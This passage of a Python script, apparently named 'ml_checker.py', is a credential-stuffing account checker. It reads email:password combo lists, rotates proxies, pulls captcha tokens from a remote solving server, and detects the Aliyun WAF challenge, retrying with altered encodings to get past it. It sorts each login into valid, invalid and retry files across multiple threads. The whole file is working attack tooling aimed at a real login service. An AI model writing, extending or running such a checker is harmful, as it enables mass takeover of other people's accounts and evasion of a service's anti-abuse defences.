        return {'server': f'http://{parts[0]}:{parts[1]}'}
    return None


def load_proxies(path):
    lines = []
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            for ln in f:
                p = _parse_proxy_line(ln)
                if p:
                    lines.append(p)
    except FileNotFoundError:
        pass
    return lines


class ProxyPool:
    def __init__(self, proxies, filepath):
        self._lock = threading.Lock()
        self._filepath = filepath
        self._all = list(proxies)
        self._dead = set()
        self._in_use = {}
        self._idx = 0

    @staticmethod
    def _key(p):
        return p.get('server', '')

    def claim(self, worker_id):
        with self._lock:
            self._in_use.pop(worker_id, None)
            alive = [p for p in self._all if self._key(p) not in self._dead]
            if not alive:
                return None
            held = {self._key(p) for p in self._in_use.values()}
            for p in alive:
                if self._key(p) not in held:
                    self._in_use[worker_id] = p
                    self._idx += 1
                    return p
            p = alive[self._idx % len(alive)]
            self._in_use[worker_id] = p
            self._idx += 1
            return p

    def mark_dead(self, proxy):
        with self._lock:
            if proxy is None or self._key(proxy) in self._dead:
                return
            self._dead.add(self._key(proxy))


def load_accounts(file_path, limit=None):
    accounts = []
    seen = set()
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if not line or ':' not in line or line.startswith('#'):
                    continue
                parts = line.split(':', 1)
                email = parts[0].strip()
                password = parts[1].strip()
                if not email or not password:
                    continue
                key = f'{email}:{password}'
                if key in seen:
                    continue
                seen.add(key)
                accounts.append((email, password))
                if limit and len(accounts) >= limit:
                    break
    except FileNotFoundError:
        pass
    return accounts


def log_debug_block(worker_id, email, password, attempt, max_retries,
                    token_srv_url, raw_token_str, tok, cert,
                    url, headers, payload,
                    status_code, resp_reason, resp_headers, resp_body,
                    elapsed_s, classification, proxy_str=None):
    now_str = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
    st = classification.get('status', 'error')
    code = classification.get('code')
    msg = classification.get('msg') or classification.get('message') or classification.get('error', '')

    body_clean = (resp_body or '').strip().replace('\r', '').replace('\n', ' ')
    if len(body_clean) > 300:
        body_snippet = body_clean[:300] + f' ... [total {len(resp_body)} bytes]'
    else:
        body_snippet = body_clean if body_clean else '<EMPTY BODY>'

    cookie_hdr = resp_headers.get('Set-Cookie') or resp_headers.get('set-cookie') or 'none'
    server_hdr = resp_headers.get('Server') or resp_headers.get('server') or 'unknown'

    border = f" {c(CYAN)}┌───────────────────────────── [DEBUG REQUEST] ─────────────────────────────{W}"
    div    = f" {c(GRAY)}├──────────────────────────────────────────────────────────────────────────{W}"
    end_b  = f" {c(CYAN)}└──────────────────────────────────────────────────────────────────────────{W}"

    lines = [
        border,
        f" │ {c(WHITE)}{BD}[Worker-{worker_id}]{W} {c(GOLD)}Account:{W} {email}:{password}  {c(GRAY)}| Attempt {attempt}/{max_retries} | {now_str}{W}",
        div,
        f" │ {c(CYAN)}[1] TOKEN FROM SERVER:{W}",
        f" │   Server URL : {token_srv_url}",
        f" │   Raw String : {raw_token_str}",
        f" │   u_atoken   : {c(GREEN) if tok else c(GRAY)}{tok or 'None (skipped in URL)'}{W}",
        f" │   u_asig     : {c(GREEN) if cert else c(RED)}{cert or 'None'}{W}",
        div,
        f" │ {c(CYAN)}[2] HTTP REQUEST:{W}",
        f" │   Method/URL : {c(WHITE)}POST {url}{W}",
        f" │   Proxy      : {proxy_str or 'Direct (no proxy)'}",
        f" │   Headers    : Content-Type: {headers.get('Content-Type')}",
        f" │                Origin: {headers.get('Origin')}",
        f" │                Referer: {headers.get('Referer')}",
        f" │                User-Agent: {headers.get('User-Agent', '')[:65]}...",
        f" │   Payload    : {json.dumps(payload)}",
        div,
        f" │ {c(CYAN)}[3] HTTP RESPONSE:{W}",
        f" │   Status     : {c(GREEN) if status_code == 200 else c(RED)}{status_code} {resp_reason}{W} {c(GRAY)}(in {elapsed_s:.2f}s){W}",
        f" │   Server     : {server_hdr}",
        f" │   Set-Cookie : {cookie_hdr[:85]}{'...' if len(cookie_hdr) > 85 else ''}",
        f" │   Body ({len(resp_body)} bytes) : {body_snippet}",
        div,
        f" │ {c(CYAN)}[4] CLASSIFICATION & VERDICT:{W}",
        f" │   Status     : {c(GREEN) if st == 'valid' else (c(RED) if st == 'invalid' else c(GOLD))}{st.upper()}{W}",
        f" │   Code       : {code if code is not None else 'N/A'}",
        f" │   Message    : {msg}",
        end_b
    ]

    plain_lines = [
        f"┌───────────────────────────── [DEBUG REQUEST] ─────────────────────────────",
        f"│ [Worker-{worker_id}] Account: {email}:{password} | Attempt {attempt}/{max_retries} | {now_str}",
        f"├──────────────────────────────────────────────────────────────────────────",
        f"│ [1] TOKEN FROM SERVER:",
        f"│   Server URL : {token_srv_url}",
        f"│   Raw String : {raw_token_str}",
        f"│   u_atoken   : {tok or 'None'}",
        f"│   u_asig     : {cert or 'None'}",
        f"├──────────────────────────────────────────────────────────────────────────",
        f"│ [2] HTTP REQUEST:",
        f"│   Method/URL : POST {url}",
        f"│   Proxy      : {proxy_str or 'Direct'}",
        f"│   Headers    : Content-Type: {headers.get('Content-Type')}, Origin: {headers.get('Origin')}, Referer: {headers.get('Referer')}",
        f"│   Payload    : {json.dumps(payload)}",
        f"├──────────────────────────────────────────────────────────────────────────",
        f"│ [3] HTTP RESPONSE:",
        f"│   Status     : {status_code} {resp_reason} (in {elapsed_s:.2f}s)",
        f"│   Server     : {server_hdr}",
        f"│   Set-Cookie : {cookie_hdr}",
        f"│   Body ({len(resp_body)} bytes): {body_snippet}",
        f"├──────────────────────────────────────────────────────────────────────────",
        f"│ [4] CLASSIFICATION & VERDICT:",
        f"│   Status     : {st.upper()}",
        f"│   Code       : {code}",
        f"│   Message    : {msg}",
        f"└──────────────────────────────────────────────────────────────────────────\n"
    ]

    with _ui_lock:
        clear_line()
        for ln in lines:
            p(ln)
        print_status()

    if DEBUG_LOG_FILE:
        try:
            with _debug_lock:
                with open(DEBUG_LOG_FILE, 'a', encoding='utf-8') as f:
                    f.write('\n'.join(plain_lines) + '\n')
        except Exception:
            pass


def cookie_header_from_session(session):
    if not session or not hasattr(session, 'cookies'):
        return ''
    try:
        parts = [f"{c.name}={c.value}" for c in session.cookies]
        return '; '.join(parts)
    except Exception:
        return ''


def is_waf_challenge(text):
    if not text:
        return False
    return ('<textarea id="renderData"' in text
            or 'aliyunCaptcha' in text
            or ('aliyun_waf' in text and '<script' in text.lower())
            or '405 Not Allowed' in text
            or '<title>405</title>' in text)


def check_single_account(email, password, proxy=None, worker_id=0, session=None, is_cffi=None, imp_tgt=None):
    if session is None:
        http, is_cffi, imp_tgt = new_http_session()
        if http:
            prime_waf_session(http, is_cffi, imp_tgt)
    else:
        http = session
        if is_cffi is None:
            is_cffi = CURL_CFFI_OK and hasattr(http, 'impersonate')

    for attempt in range(1, MAX_RETRIES + 1):
        if stop_flag:
            return {'status': 'error', 'error': 'stopped', 'msg': '',
                    'login': email, 'password': password}

        t_fetch_start = time.time()
        tok, cert, raw_tok_str = fetch_token_from_server(TOKEN_SERVER_URL, timeout=30)
        t_fetch_elapsed = time.time() - t_fetch_start

        if not cert:
            save_to_retry(email, password)
            err_res = {'status': 'error', 'error': 'no_server_token',
                    'message': f'No tokens from server: {raw_tok_str}',
                    'login': email, 'password': password}
            if DEBUG_REQUESTS:
                log_debug_block(
                    worker_id=worker_id,
                    email=email,
                    password=password,
                    attempt=attempt,
                    max_retries=MAX_RETRIES,
                    token_srv_url=TOKEN_SERVER_URL,
                    raw_token_str=raw_tok_str or 'NO_TOKENS (empty pool / server timeout)',
                    tok=None,
                    cert=None,
                    url=f"{LOGIN_URL}/ (request skipped - no token)",
                    headers={},
                    payload={},
                    status_code=0,
                    resp_reason="No token available from pool",
                    resp_headers={},
                    resp_body="",
                    elapsed_s=t_fetch_elapsed,
                    classification=err_res,
                    proxy_str=str(proxy.get('server')) if proxy else None
                )
            return err_res

        payload = gen_payload(email, password)

        clean_tok = str(tok).strip() if tok and str(tok).strip().upper() not in ('N/A', 'NONE', 'NULL', 'UNDEFINED', '') else None
        clean_cert = str(cert).strip() if cert and str(cert).strip().upper() not in ('N/A', 'NONE', 'NULL', 'UNDEFINED', '') else None

        if clean_tok and clean_cert:
            submit_url = f'{LOGIN_URL}/?u_atoken={clean_tok}&u_asig={clean_cert}'
        elif clean_cert:
            submit_url = f'{LOGIN_URL}/?u_asig={clean_cert}'
        elif clean_tok:
            submit_url = f'{LOGIN_URL}/?u_atoken={clean_tok}'
        else:
            submit_url = f'{LOGIN_URL}/'

        if hasattr(http, 'cookies') and not http.cookies:
            prime_waf_session(http, is_cffi, imp_tgt)

        headers = build_api_headers('application/json; charset=UTF-8')
        cookie_str = cookie_header_from_session(http)
        if cookie_str:
            headers['Cookie'] = cookie_str

        proxies = None
        prox_str = None
        if proxy:
            srv = proxy.get('server', '')
            if proxy.get('username') and proxy.get('password'):
                raw_srv = srv.replace('http://', '').replace('https://', '')
                prox_url = f"http://{proxy['username']}:{proxy['password']}@{raw_srv}"
            else:
                prox_url = srv
            if prox_url:
                proxies = {'http': prox_url, 'https': prox_url}
                prox_str = srv

        raw = ''
        status_code = 0
        resp_reason = ''
        resp_headers = {}
        t_req_start = time.time()
        sent_headers = dict(headers)
        sent_payload = payload

        compact_json = json.dumps(payload, separators=(',', ':'))

        try:
            req_func = http.post if http else requests.post
            r = req_func(submit_url, data=compact_json, headers=headers,
                         proxies=proxies, timeout=15)
            status_code = r.status_code
            resp_reason = getattr(r, 'reason', '') or ''
            resp_headers = dict(r.headers)
            raw = r.text

            if (status_code == 405 or is_waf_challenge(raw) or not looks_real_json(raw)):
                dbg_log('WAF_FALLBACK', f'Primary JSON POST got {status_code} challenge; trying form-encoded...')

                headers_form = build_api_headers('application/x-www-form-urlencoded; charset=UTF-8')
                cookie_str = cookie_header_from_session(http)
                if cookie_str:
                    headers_form['Cookie'] = cookie_str

                form_payload = {
                    'op': payload['op'],
                    'sign': payload['sign'],
                    'params': json.dumps(payload['params'], separators=(',', ':')),
                    'lang': payload['lang']
                }
                try:
                    r_form = req_func(submit_url, data=form_payload, headers=headers_form,
                                      proxies=proxies, timeout=15)
                    if looks_real_json(r_form.text) or (r_form.status_code == 200 and not is_waf_challenge(r_form.text)):
                        status_code = r_form.status_code
                        resp_reason = getattr(r_form, 'reason', '') or ''
                        resp_headers = dict(r_form.headers)
                        raw = r_form.text
                        sent_headers = headers_form
                        sent_payload = form_payload
                        dbg_log('WAF_FALLBACK', 'Form-encoded fallback succeeded with valid response!')
                except Exception as e_form:
                    dbg_log('WAF_FALLBACK', f'Form fallback 1 error: {e_form}')

                if not looks_real_json(raw) and status_code == 405:
                    try:
                        r_form2 = req_func(submit_url, data={'data': compact_json}, headers=headers_form,
                                           proxies=proxies, timeout=15)
                        if looks_real_json(r_form2.text) or (r_form2.status_code == 200 and not is_waf_challenge(r_form2.text)):
                            status_code = r_form2.status_code
                            resp_reason = getattr(r_form2, 'reason', '') or ''
                            resp_headers = dict(r_form2.headers)
                            raw = r_form2.text
                            sent_headers = headers_form
                            sent_payload = {'data': compact_json}
                            dbg_log('WAF_FALLBACK', 'Form data=JSON fallback succeeded!')
                    except Exception as e_form2:
                        dbg_log('WAF_FALLBACK', f'Form fallback 2 error: {e_form2}')

                if status_code == 405 or is_waf_challenge(raw):
                    prime_waf_session(http, is_cffi, imp_tgt)

        except Exception as e:
            t_req_elapsed = time.time() - t_req_start
            err_msg = str(e)
            is_timeout = 'timeout' in err_msg.lower()
            err_res = {'status': 'error',
                    'error': 'fetch_timeout' if is_timeout else 'fetch_fail',
                    'message': f'HTTP error: {err_msg[:60]}',
                    'login': email, 'password': password}
            if DEBUG_REQUESTS:
                log_debug_block(
                    worker_id=worker_id,
                    email=email,
                    password=password,
                    attempt=attempt,
                    max_retries=MAX_RETRIES,
                    token_srv_url=TOKEN_SERVER_URL,
                    raw_token_str=raw_tok_str,
                    tok=clean_tok,
                    cert=clean_cert,
                    url=submit_url,
                    headers=sent_headers,
                    payload=sent_payload,
                    status_code=status_code,
                    resp_reason=f"Exception: {err_msg[:60]}",
                    resp_headers=resp_headers,
                    resp_body=raw,
                    elapsed_s=t_req_elapsed,
                    classification=err_res,
                    proxy_str=prox_str
                )
            if attempt < MAX_RETRIES:
                time.sleep(0.5)
                continue
            save_to_retry(email, password)
            return err_res

        t_req_elapsed = time.time() - t_req_start

        result = classify_login(None, raw)
        result['email'] = email
        result['login'] = email
        result['password'] = password
        result['http_status'] = status_code
        result['token_used'] = {'u_atoken': clean_tok, 'u_asig': clean_cert}

        st = result.get('status')

        if DEBUG_REQUESTS:
            log_debug_block(
                worker_id=worker_id,
                email=email,
                password=password,
                attempt=attempt,
                max_retries=MAX_RETRIES,
                token_srv_url=TOKEN_SERVER_URL,
                raw_token_str=raw_tok_str,
                tok=clean_tok,
                cert=clean_cert,
                url=submit_url,
                headers=sent_headers,
                payload=sent_payload,
                status_code=status_code,
                resp_reason=resp_reason,
                resp_headers=resp_headers,
                resp_body=raw,
                elapsed_s=t_req_elapsed,
                classification=result,
                proxy_str=prox_str
            )

        if st in ('valid', 'invalid'):
            return result

        if st in ('captcha', 'captcha_fail') or result.get('error') in ('waf_or_nonjson', 'waf_405_challenge'):
            if attempt < MAX_RETRIES:
                time.sleep(0.5)
                continue
            save_to_retry(email, password)
            if status_code == 405:
                detail = "token_rejected (HTTP 405 Aliyun WAF Challenge / non-JSON)"
            elif status_code != 200 and status_code != 0:
                detail = f"token_rejected (HTTP {status_code} non-JSON)"
            elif st in ('captcha', 'captcha_fail'):
                detail = f"token_rejected (Server requested captcha again: {result.get('msg', '')})"
            else:
                detail = "token_rejected"
            result['error'] = detail
            result['status'] = 'error'
            return result

        if st == 'error':
            if attempt < MAX_RETRIES:
                time.sleep(0.5)
                continue
            save_to_retry(email, password)
            return result

        return result

    save_to_retry(email, password)
    return {'status': 'error', 'error': 'max_retries_exceeded', 'msg': '',
            'login': email, 'password': password}


def worker_loop(worker_id, todo, max_min, counts, count_lock, state, pool):
    time.sleep(worker_id * 0.05)
    proxy = pool.claim(worker_id) if pool else None
    session, is_cffi, imp_tgt = new_http_session()
    if session:
        prime_waf_session(session, is_cffi, imp_tgt)

    while not stop_flag:
        if max_min is not None and time.time() - state['t0'] > max_min * 60:
            with state['lock']:
                if not state['announced']:
                    state['announced'] = True
                    p(f'{C_CYAN}  --max-minutes reached ({max_min}m); stopping cleanly{RST}')
            break

        with state['lock']:
            if state['idx'] >= len(todo):
                break
            email, password = todo[state['idx']]
            state['idx'] += 1

        t_acc = time.time()
        try:
            result = check_single_account(email, password, proxy=proxy, worker_id=worker_id,
                                          session=session, is_cffi=is_cffi, imp_tgt=imp_tgt)
        except Exception as e:
            result = {'status': 'error', 'error': str(e)[:160],
                      'msg': '', 'login': email, 'password': password}

        st = result.get('status')
        if pool and proxy is not None and result.get('error') in ('fetch_timeout', 'fetch_fail'):
            pool.mark_dead(proxy)
            proxy = pool.claim(worker_id)

        with count_lock:
            counts['n'] += 1
            if st == 'valid':
                counts['v'] += 1
            elif st == 'invalid':
                counts['i'] += 1
            else:
                counts['e'] += 1

        finish_single(email, password, result)


C_CYAN = c(CYAN)
C_GRAY = c(GRAY)
C_MUTED = c(GRAY)
C_GREEN = c(GREEN)
C_GOLD = c(GOLD)
C_RED = c(RED)
C_AMBER = c(SUNSET)
C_ORANGE = c(SUNSET)
C_WHITE = c(WHITE)
C_TEAL = c(TEAL)
C_PURPLE = c(PURPLE)
RST = "\033[0m"
BOLD = "\033[1m"


def _prompt(label, default=None):
    try:
        raw = input(f" {c(CYAN)}\u2514\u2500 {label} {W}").strip()
        return raw
    except KeyboardInterrupt:
        raise
    except EOFError:
        return default or ""


def _print_interrupt():
    p('\n\nInterrupting...')


def _set_stop():
    global stop_flag
    stop_flag = True


def persist_retry_remaining():
    try:
        with open(_out_path(RETRY_OUT), "r", encoding="utf-8", errors="ignore") as f:
            pending = [ln.strip() for ln in f if ":" in ln.strip()]
    except FileNotFoundError:
        return
    if not pending:
        return
    seen = set()
    try:
        with open(RETRY_FILE, "r", encoding="utf-8", errors="ignore") as f:
            for ln in f:
                s = ln.strip()
                if s and ":" in s:
                    seen.add(extract_combo(s))
    except FileNotFoundError:
        pass
    fresh = []
    for ln in pending:
        try:
            key = extract_combo(ln)
        except Exception:
            continue
        if key in seen:
            continue
        seen.add(key)
        fresh.append(ln)
    if not fresh:
        return
    with _ui_lock:
        try:
            with open(RETRY_FILE, "a", encoding="utf-8") as f:
                for ln in fresh:
                    f.write(ln + "\n")
            p(f" {c(GOLD)}\u25c6 {len(fresh):,} unresolved accounts saved to "
              f"{c(WHITE)}{shortpath(RETRY_FILE)}{W}\n")
        except Exception:
            pass


def main():
    global DEBUG, stop_flag, TOKEN_SERVER_URL
    global VALID_FILE, INVALID_FILE, ERRORS_FILE, RETRY_OUT, _device_manager
    global VALID_DETAILED, COLLECT_DIR, OUT_DIR

    try:
        signal.signal(signal.SIGINT, lambda *a: (_print_interrupt(), _set_stop()))
    except Exception:
        pass

    args = sys.argv[1:]
    acc_file = args[0] if args and not args[0].startswith('--') else ''
    DEBUG = '--debug' in args or '-d' in args
    use_proxies = '--proxies' in args
    no_prompt = '--no-prompt' in args

    args_max_minutes = None
    for i, a in enumerate(args):
        if a == '--max-minutes' and i + 1 < len(args):
            try:
                args_max_minutes = float(args[i + 1])
            except ValueError:
                args_max_minutes = None
            break

    args_threads = None
    for i, a in enumerate(args):
        if a in ('--threads', '-t', '--workers', '--browsers') and i + 1 < len(args):
            try:
                args_threads = max(1, min(THREAD_LIMIT, int(args[i + 1])))
            except ValueError:
                args_threads = None
            break

    args_out_label = None
    for i, a in enumerate(args):
        if a == '--out-label' and i + 1 < len(args):
            label = args[i + 1].strip().replace(' ', '_')
            if label.endswith(('.txt', '.log', '.out')):
                label = os.path.splitext(label)[0]
            args_out_label = label
            break

    if '--token-server' in args:
        i = args.index('--token-server')
        if i + 1 < len(args):
            TOKEN_SERVER_URL = args[i + 1].strip()
    if '--no-token-server' in args:
        TOKEN_SERVER_URL = ''

    clear()
    print_banner()

    interactive = not no_prompt and bool(sys.stdin and hasattr(sys.stdin, 'isatty') and sys.stdin.isatty())

    if interactive:
        p(f" {gtop()}")
        p(f" {gtitle(f'{c(WHITE)}{BD}PROXY SETUP{W}')}")
        p(f" {gmid()}")
        p(f" {grow(f'{c(CYAN)}Use proxies?{W}   {c(GRAY)}y / n{W}')}")
        p(f" {gbot()}")
        while True:
            raw = _prompt("proxies", "n").lower()
            if raw in ("y", "yes", "n", "no", ""):
                use_proxies = raw in ("y", "yes")
                break
            p(f" {c(RED)}Enter y or n.{W}")
        if use_proxies:
            while True:
                pth = _prompt("path", PROXY_FILE).strip('"') or PROXY_FILE
                if os.path.exists(pth):
                    break
                p(f" {c(RED)}Not found: {pth}{W}")
        else:
            p(f" {c(GRAY)}Proxies disabled — running direct.{W}\n")

        p(f" {gtop()}")
        p(f" {gtitle(f'{c(WHITE)}{BD}SESSION SETUP{W}')}")
        p(f" {gmid()}")
        p(f" {grow(f'{c(CYAN)}01  INPUT FILE{W}')}")
        p(f" {gbot()}")
        while True:
            f_ = _prompt("path", acc_file)
            if not f_ and not acc_file:
                p(f" {c(RED)}No file entered.{W}")
                continue
            f_ = f_ or acc_file
            if not os.path.exists(f_):
                p(f" {c(RED)}Not found: {f_}{W}")
                continue
            acc_file = f_
            break

        p(f"\n {gtop()}")
        p(f" {grow(f'{c(PURPLE)}02  OUTPUT LABEL{W}')}")
        p(f" {gbot()}")
        out_name = _prompt("label", "results1").replace(" ", "_")
        if not out_name:
            out_name = "results1"
        if out_name.endswith(('.txt', '.log', '.out')):
            out_name = os.path.splitext(out_name)[0]
        OUT_DIR = os.path.join(OUTPUT_FOLDER, out_name)
        VALID_FILE = 'valid.txt'
        INVALID_FILE = 'invalid.txt'
        ERRORS_FILE = 'errors.txt'
        RETRY_OUT = 'retry.txt'
        VALID_DETAILED = 'valid_detailed.txt'
        COLLECT_DIR = os.path.join(OUT_DIR, 'Collection Tier')
        p(f" {c(GREEN)}Output: {c(WHITE)}{shortpath(OUT_DIR)}\\{W} "
          f"(valid.txt, invalid.txt, errors.txt, retry.txt, "
          f"valid_detailed.txt, Collection Tier)\n")

        with open(acc_file, "r", encoding="utf-8", errors="ignore") as f:
            all_lines = [ln.strip() for ln in f if ":" in ln.strip()]
        if not all_lines:
            p(f" {c(RED)}No accounts found.{W}")
            return

        checked_set = load_checked()
        before = len(all_lines)
        all_lines = [ln for ln in all_lines if extract_combo(ln) not in checked_set]
        skipped = before - len(all_lines)
        if skipped > 0:
            p(f" {c(GREEN)}Loaded {c(WHITE)}{before:,}{c(GREEN)} accounts{W}")
            p(f" {c(GOLD)}Skipped {c(WHITE)}{skipped:,}{c(GOLD)} already checked{W}")
            p(f" {c(CYAN)}Remaining {c(WHITE)}{len(all_lines):,}{c(CYAN)} to check{W}\n")
        else:
            p(f" {c(GREEN)}Loaded {c(WHITE)}{before:,}{c(GREEN)} accounts{W}\n")
        if not all_lines:
            p(f" {c(GREEN)}All accounts already checked!{W}\n")
            return
        accounts = []
        for combo in all_lines:
            parts = combo.split(":", 1)
            if len(parts) == 2:
                lo, pw = parts[0].strip(), parts[1].strip()
                if lo and pw:
                    accounts.append((lo, pw))

        p(f" {gtop()}")
        p(f" {grow(f'{c(TEAL)}03  THREADS (MAX 10){W}')}")
        p(f" {gbot()}")
        p(f" {c(GRAY)}Enter number of threads (1-{THREAD_LIMIT}, default: 1). Max: {THREAD_LIMIT} threads.{W}")
        while True:
            raw = _prompt("threads", str(args_threads or 1))
            if not raw:
                worker_count = max(1, min(THREAD_LIMIT, args_threads or 1))
                break
            try:
                val = int(raw)
                if 1 <= val <= THREAD_LIMIT:
                    worker_count = val
                    break
                p(f" {c(RED)}Please enter a number between 1 and {THREAD_LIMIT}.{W}")
            except ValueError:
                p(f" {c(RED)}Enter a valid number.{W}")

        p(f"\n {gtop()}")
        p(f" {gtitle(f'{c(WHITE)}{BD}SESSION PREVIEW{W}')}")
        p(f" {gmid()}")
        p(f" {grow(f'{c(GRAY)}Input queue{W}   {c(WHITE)}{len(accounts):,} accounts{W}')}")
        _out_dir_path = shortpath(OUT_DIR) + '\\'
        p(f" {grow(f'{c(GRAY)}Output set{W}    {c(WHITE)}{_out_dir_path}{W}')}")
        p(f" {grow(f'{c(GRAY)}Threads{W}       {c(WHITE)}{worker_count}{W}')}")
        _srv_txt = TOKEN_SERVER_URL if TOKEN_SERVER_URL else "disabled"
        p(f" {grow(f'{c(GRAY)}Token server{W}  {c(WHITE)}{_srv_txt}{W}')}")
        p(f" {grow(f'{c(GRAY)}Solving{W}       {c(WHITE)}Remote Server (1 token = 1 account){W}')}")
        p(f" {gbot()}")
    else:
        if not acc_file:
            p(f"{C_AMBER}  usage: python ml_checker.py <accounts.txt> "
              f"[--proxies] [--threads N] [--token-server URL] [--out-label NAME]{RST}")
            sys.exit(1)
        accounts = load_accounts(acc_file)
        if not accounts:
            p(f"{C_RED}  no accounts found in {acc_file}{RST}")
            sys.exit(1)
        out_name = (args_out_label or "results1").replace(" ", "_")
        if out_name.endswith(('.txt', '.log', '.out')):
            out_name = os.path.splitext(out_name)[0]
        OUT_DIR = os.path.join(OUTPUT_FOLDER, out_name)
        VALID_FILE = "valid.txt"
        INVALID_FILE = "invalid.txt"
        ERRORS_FILE = "errors.txt"
        RETRY_OUT = "retry.txt"
        VALID_DETAILED = "valid_detailed.txt"
        COLLECT_DIR = os.path.join(OUT_DIR, "Collection Tier")
        worker_count = max(1, min(THREAD_LIMIT, args_threads or 1))

    done = set()
    for fn in (VALID_FILE, INVALID_FILE, ERRORS_FILE, RETRY_OUT):
        path = _out_path(fn)
        if not os.path.exists(path):
            continue
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                if ':' in line:
                    done.add(line.split(':', 1)[0].strip())
    todo = [a for a in accounts if a[0] not in done]
    p(f"{C_CYAN}  loaded {len(accounts)} accounts  ·  "
      f"{'proxy' if use_proxies else 'direct'}{RST}")
    if len(done):
        p(f"{C_MUTED}  resuming: {len(todo)} left (already checked {len(done)}){RST}")
    if not todo:
        p(f"{C_GREEN}  nothing to do{RST}")
        sys.exit(0)

    proxies = load_proxies(PROXY_FILE) if use_proxies else []
    if use_proxies and not proxies:
        p(f"{C_AMBER}  ! proxies.txt empty/missing — running direct{RST}")
    pool = ProxyPool(proxies, PROXY_FILE) if (use_proxies and proxies) else None

    p(f"{C_CYAN}  running {worker_count} thread(s) (1 token per 1 account via {TOKEN_SERVER_URL}){RST}")
    p('')

    os.makedirs(OUT_DIR, exist_ok=True)
    DEBUG_LOG_FILE = os.path.join(OUT_DIR, "debug_requests.log")
    reset_stats()
    stats["total"] = len(todo)
    stats["start_time"] = time.time()

    if INFO_AVAILABLE:
        try:
            global _device_manager
            _device_manager = DeviceManager(DEVICES_FILE)
            if _device_manager.devices:
                p(f" {c(GREEN)}\u25c6 Player info online{W} "
                  f"{c(WHITE)}{len(_device_manager.devices):,} devices{W}\n")
            else:
                p(f" {c(GOLD)}\u25c6 Player info disabled (no devices){W}\n")
                _device_manager = None
        except Exception:
            _device_manager = None

    p(f" {gtop()}")
    p(f" {gtitle(f'{c(WHITE)}{BD}LIVE CHECK{W}')}")
    p(f" {gmid()}")
    _tot_accs = stats['total']
    p(f" {grow(f'{c(GRAY)}Accounts{W}    {c(WHITE)}{_tot_accs:,}{W}')}")
    p(f" {grow(f'{c(GRAY)}Threads{W}     {c(WHITE)}{worker_count}{W}')}")
    _hdr_srv = TOKEN_SERVER_URL if TOKEN_SERVER_URL else "disabled"
    p(f" {grow(f'{c(GRAY)}Token Server{W} {c(WHITE)}{_hdr_srv}{W}')}")
    _dbg_status = f"{c(GREEN)}ACTIVE{W} (verbose debug on every request)" if DEBUG_REQUESTS else f"{c(GRAY)}OFF{W}"
    p(f" {grow(f'{c(GRAY)}Debug Mode{W}  {_dbg_status}')}")
    if DEBUG_REQUESTS:
        p(f" {grow(f'{c(GRAY)}Debug Log{W}   {c(WHITE)}{shortpath(DEBUG_LOG_FILE)}{W}')}")
    p(f" {grow(f'{c(GOLD)}Control{W}     {c(WHITE)}Ctrl+C to stop{W}')}")
    p(f" {gbot()}")
    p("")

    counts = {'n': 0, 'v': 0, 'i': 0, 'e': 0}
    count_lock = threading.Lock()
    max_min = args_max_minutes if args_max_minutes else None

    def run_queue(_todo, _pool):
        _state = {'lock': threading.Lock(), 'idx': 0, 'announced': True, 't0': time.time()}
        _threads = []
        for w in range(worker_count):
            th = threading.Thread(target=worker_loop,
                                  args=(w, _todo, max_min, counts, count_lock, _state, _pool),
                                  daemon=True)
            _threads.append(th)
            th.start()
        for th in _threads:
            th.join()

    p(f" {c(CYAN)}\u25c6 Round 1{W}\n")
    run_queue(todo, pool)

    round_no = 2
    while not stop_flag and round_no <= RETRY_ROUNDS:
        retry_accs = []
        seen = set()
        try:
            with open(_out_path(RETRY_OUT), "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if not line or ":" not in line:
                        continue
                    key = extract_combo(line)
                    if key in seen:
                        continue
                    seen.add(key)
                    parts = line.split(":", 1)
                    retry_accs.append((parts[0].strip(), parts[1].strip()))
        except FileNotFoundError:
            break
        if not retry_accs:
            break
        p(f" {c(CYAN)}\u25c6 Round {round_no}{W} {c(WHITE)}{len(retry_accs):,}{W} accounts to retry\n")
        run_queue(retry_accs, pool)
        round_no += 1

    if stop_flag:
        p(f"\n\n {c(GOLD)}Stopped by user.{W}\n")
    else:
        p(f"\n\n {c(GREEN)}Checking complete.{W}\n")

    persist_retry_remaining()
    p(f"\r{' ' * 60}\r", end="")
    print_summary()


if __name__ == '__main__':
    main()
